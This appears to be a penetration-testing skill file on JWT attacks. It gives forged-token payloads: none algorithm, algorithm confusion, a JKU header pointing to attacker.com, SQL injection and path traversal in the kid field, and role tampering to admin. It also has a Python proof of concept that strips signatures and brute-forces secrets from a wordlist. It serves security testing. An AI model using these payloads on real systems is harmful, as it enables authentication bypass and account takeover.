---
name: jwt_attacks
description: JWT (JSON Web Token) security testing methodology
version: 1.0.0
tags: [authentication, token, A07:2021, API2:2023]
---

# JWT Security Testing

## Overview
JWTs are used for authentication and authorization. Weak implementations can lead to authentication bypass.

## JWT Structure
```
header.payload.signature

# Example:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ.
Gfx6VO9tcxwk6xqx9yYzSfebfeakZp5JYIgP_edcw_A
```

## Attacks

### 1. Algorithm Confusion (Critical)
Change algorithm from RS256 to HS256, use public key as secret.

```python
# Original header
{"alg": "RS256", "typ": "JWT"}

# Modified to:
{"alg": "HS256", "typ": "JWT"}
# Sign with public key as HMAC secret
```

### 2. None Algorithm (Critical)
```python
# Change header to:
{"alg": "none", "typ": "JWT"}

# Remove signature:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.
```

### 3. Weak Secret (High)
Common secrets:
```
secret
password
123456
your-256-bit-secret
jwt-secret
```

### 4. Key Injection (JKU/X5U)
```json
// Inject your own key URL
{"alg": "RS256", "jku": "https://attacker.com/jwks.json", "typ": "JWT"}
```

### 5. KID Injection
```json
// SQL Injection in kid
{"alg": "HS256", "kid": "key1' UNION SELECT 'my-secret'--", "typ": "JWT"}

// Path traversal
{"alg": "HS256", "kid": "../../dev/null", "typ": "JWT"}
```

### 6. Expired Token Acceptance
```python
# Check if expired tokens still work
# Modify exp claim to past timestamp
```

### 7. Claim Tampering
```json
// Original
{"sub": "user123", "role": "user"}

// Modified
{"sub": "user123", "role": "admin"}
```

## Testing Methodology

### 1. Decode and Analyze
```bash
# Decode header (base64)
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
```

### 2. Check for None Algorithm
### 3. Try Algorithm Confusion
### 4. Brute Force Secret
### 5. Check Expiration Validation
### 6. Test Claim Modifications

## PoC Template
```python
import jwt
import base64
import json

def test_jwt_none(token):
    """Test None algorithm attack"""
    parts = token.split('.')
    
    # Decode header
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # Change to none algorithm
    header['alg'] = 'none'
    
    # Encode new token without signature
    new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
    new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
    
    return f"{new_header.decode()}.{new_payload.decode()}."


def bruteforce_secret(token, wordlist):
    """Brute force JWT secret"""
    for secret in wordlist:
        try:
            jwt.decode(token, secret, algorithms=['HS256'])
            print(f"[+] Found secret: {secret}")
            return secret
        except:
            pass
    return None
```

## Tools
- jwt.io (manual analysis)
- jwt_tool
- hashcat (brute force)

## Impact
- Authentication bypass
- Privilege escalation
- Account takeover
